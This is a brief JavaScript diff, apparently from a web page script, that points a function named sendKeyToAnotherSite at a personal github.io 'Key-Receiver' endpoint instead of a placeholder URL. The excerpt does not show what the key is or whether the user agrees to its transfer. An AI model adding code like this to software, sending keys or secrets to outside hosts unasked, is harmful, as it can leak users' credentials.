@@ -20,7 +20,7 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   async function sendKeyToAnotherSite(key) {
-    const otherSiteUrl = "https://example.com/other-site-endpoint";
+    const otherSiteUrl = "https://gustavotyx.github.io/Key-Receiver/";
     const data = new URLSearchParams();
     data.append("key", key);
 
